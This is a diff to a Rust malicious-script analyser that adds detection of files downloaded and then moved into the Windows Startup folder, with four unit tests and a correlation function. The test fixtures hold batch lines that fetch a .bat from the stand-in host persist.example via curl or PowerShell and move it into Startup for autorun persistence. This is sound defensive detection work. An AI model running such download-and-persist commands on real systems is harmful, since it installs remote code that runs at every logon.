@@ -2816,6 +2816,93 @@ reg add \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v S
     }
 
     #[test]
+    fn move_into_startup_folder_emits_persistence_trait() {
+        let script = br#"@echo off
+set "cmdDestination=%USERPROFILE%\Downloads\startupppp.bat"
+set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+move "%cmdDestination%" "%startupFolder%"
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence {
+                    hive,
+                    key,
+                    value_name,
+                    command,
+                } if hive == "StartupFolder"
+                    && key.ends_with(r"Microsoft\Windows\Start Menu\Programs\Startup")
+                    && value_name == "startupppp.bat"
+                    && command.ends_with(r"Microsoft\Windows\Start Menu\Programs\Startup\startupppp.bat")
+            )),
+            "Startup-folder move persistence missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn downloaded_file_moved_into_startup_folder_emits_url_argument() {
+        let script = br#"@echo off
+curl -L -o "%USERPROFILE%\Downloads\startupppp.bat" https://persist.example/startupppp.bat
+move "%USERPROFILE%\Downloads\startupppp.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd.ends_with(r"Microsoft\Windows\Start Menu\Programs\Startup\startupppp.bat")
+                        && url == "https://persist.example/startupppp.bat"
+            )),
+            "Startup-folder move did not link persisted file to download URL: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_download_moved_into_startup_folder_emits_url_argument() {
+        let script = br#"@echo off
+powershell -Command "& { Invoke-WebRequest -Uri 'https://persist.example/startupppp.bat' -OutFile 'C:\Users\puncher\Downloads\startupppp.bat' }"
+move "C:\Users\puncher\Downloads\startupppp.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd.ends_with(r"Microsoft\Windows\Start Menu\Programs\Startup\startupppp.bat")
+                        && url == "https://persist.example/startupppp.bat"
+            )),
+            "PowerShell download moved into Startup was not linked to URL: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn scanned_download_moved_into_startup_folder_emits_url_argument() {
+        let script = br#"@echo off
+if 1==0 powershell -Command "& { Invoke-WebRequest -Uri 'https://persist.example/startupppp.bat' -OutFile 'C:\Users\puncher\Downloads\startupppp.bat' }"
+move "C:\Users\puncher\Downloads\startupppp.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd.ends_with(r"Microsoft\Windows\Start Menu\Programs\Startup\startupppp.bat")
+                        && url == "https://persist.example/startupppp.bat"
+            )),
+            "Scanned download moved into Startup was not linked to URL: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn schtasks_create_emits_persistence_trait() {
         // `schtasks /create /tn X /tr Y` registers a scheduled-task
         // autorun. Same Persistence trait as reg-add Run, with
@@ -12763,6 +12850,7 @@ fn analyze_inner(
     final_profile_mark!("summarize_multiline_base64_pe");
     scan_recovered_artifact_strings(&mut env);
     final_profile_mark!("recovered_artifact_strings");
+    correlate_startup_folder_downloads(&mut env.traits);
     dedup_traits(&mut env.traits, cfg.max_traits_per_kind);
     final_profile_mark!("final_dedup");
     profile_mark!("final_scan_and_dedup");
@@ -13408,6 +13496,71 @@ fn semantic_dedup_key(t: &Trait) -> Option<String> {
         } => Some(format!("UncWebDavC2\0{share_path}\0{http_url}")),
         _ => None,
     }
+}
+
+fn correlate_startup_folder_downloads(traits: &mut Vec<Trait>) {
+    let startup_persistence = traits
+        .iter()
+        .filter_map(|t| match t {
+            Trait::Persistence {
+                hive,
+                value_name,
+                command,
+                ..
+            } if hive == "StartupFolder" && !value_name.is_empty() && !command.is_empty() => {
+                Some((value_name.clone(), command.clone()))
+            }
+            _ => None,
+        })
+        .collect::<Vec<_>>();
+    if startup_persistence.is_empty() {
+        return;
+    }
+
+    let downloads = traits
+        .iter()
+        .filter_map(|t| match t {
+            Trait::Download {
+                src,
+                dst: Some(dst),
+                ..
+            } => Some((download_dst_basename(dst)?.to_string(), src.clone())),
+            Trait::CertutilDownload { url, dst } | Trait::BitsadminDownload { url, dst } => {
+                Some((download_dst_basename(dst)?.to_string(), url.clone()))
+            }
+            _ => None,
+        })
+        .collect::<Vec<_>>();
+
+    for (value_name, command) in startup_persistence {
+        for (download_name, url) in &downloads {
+            if !download_name.eq_ignore_ascii_case(&value_name) {
+                continue;
+            }
+            if traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument {
+                        cmd: existing_cmd,
+                        url: existing_url,
+                    } if existing_cmd == &command && existing_url == url
+                )
+            }) {
+                continue;
+            }
+            traits.push(Trait::UrlArgument {
+                cmd: command.clone(),
+                url: url.clone(),
+            });
+        }
+    }
+}
+
+fn download_dst_basename(path: &str) -> Option<&str> {
+    path.trim_matches(['"', '\''])
+        .rsplit(['\\', '/'])
+        .next()
+        .filter(|name| !name.is_empty())
 }
 
 fn resolve_rundll32_download_urls(traits: &mut [Trait]) {
